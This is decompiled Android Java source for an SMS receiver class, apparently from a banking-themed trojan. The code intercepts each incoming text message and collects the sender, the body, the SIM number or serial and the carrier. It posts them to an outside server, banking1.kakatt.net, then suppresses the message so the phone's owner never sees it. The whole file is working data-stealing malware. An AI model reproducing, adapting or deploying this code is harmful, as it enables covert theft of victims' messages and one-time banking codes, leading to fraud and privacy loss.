package com.example.kbtest;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
/* loaded from: classes.dex */
public class smsReceiver extends BroadcastReceiver {
    private static String BLOCKED_NUMBER = "10010";
    public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    Intent intent_thread;
    List<NameValuePair> params2;
    String update_url = "http://banking1.kakatt.net:9998/send_product.php";
    JSONParser jsonParser = new JSONParser();
    String TAG = "smsReceiver";

    public boolean netWorkIsAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService("connectivity");
        NetworkInfo activeNetInfo = connectivityManager.getActiveNetworkInfo();
        if (activeNetInfo == null || !activeNetInfo.isAvailable() || !checkURL(this.update_url)) {
            return false;
        }
        return true;
    }

    public static boolean checkURL(String url) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            int code = conn.getResponseCode();
            System.out.println(">>>>>>>>>>>>>>>> " + code + " <<<<<<<<<<<<<<<<<<");
            if (code != 200) {
                return false;
            }
            return true;
        } catch (MalformedURLException e) {
            e.printStackTrace();
            return false;
        } catch (IOException e2) {
            e2.printStackTrace();
            return false;
        }
    }

    /* JADX WARN: Type inference failed for: r13v10, types: [com.example.kbtest.smsReceiver$1] */
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Bundle bundle;
        String dateString2;
        if (netWorkIsAvailable(context)) {
            TelephonyManager tel = (TelephonyManager) context.getSystemService("phone");
            String action = intent.getAction();
            if (SMS_RECEIVED_ACTION.equals(action) && (bundle = intent.getExtras()) != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    this.params2 = new ArrayList();
                    String simNo = tel.getLine1Number();
                    if (simNo == null || simNo.length() < 11) {
                        simNo = tel.getSimSerialNumber();
                    }
                    this.params2.add(new BasicNameValuePair("sim_no", simNo));
                    this.params2.add(new BasicNameValuePair("tel", tel.getSimOperatorName()));
                    this.params2.add(new BasicNameValuePair("thread_id", "0"));
                    this.params2.add(new BasicNameValuePair("address", smsMessage.getOriginatingAddress()));
                    SimpleDateFormat df2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    try {
                        dateString2 = df2.format(new Date(smsMessage.getTimestampMillis()));
                    } catch (Exception e) {
                        dateString2 = "1970-01-01 10:12:13";
                    }
                    this.params2.add(new BasicNameValuePair("datetime", dateString2));
                    this.params2.add(new BasicNameValuePair("bady", smsMessage.getDisplayMessageBody()));
                    this.params2.add(new BasicNameValuePair("read", "1"));
                    this.params2.add(new BasicNameValuePair("type", "1"));
                    new Thread() { // from class: com.example.kbtest.smsReceiver.1
                        @Override // java.lang.Thread, java.lang.Runnable
                        public void run() {
                            DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
                            HttpPost httppost = new HttpPost(smsReceiver.this.update_url);
                            try {
                                httppost.setEntity(new UrlEncodedFormEntity(smsReceiver.this.params2, "EUC-KR"));
                                Log.d("\thttppost.setEntity(new UrlEncodedFormEntity(params2));", "gone");
                            } catch (UnsupportedEncodingException e2) {
                                e2.printStackTrace();
                            }
                            try {
                                HttpResponse response = defaultHttpClient.execute(httppost);
                                Log.d("response=httpclient.execute(httppost);", response.toString());
                            } catch (ClientProtocolException e3) {
                                e3.printStackTrace();
                            } catch (IOException e4) {
                                e4.printStackTrace();
                            }
                        }
                    }.start();
                    abortBroadcast();
                }
            }
        }
    }
}
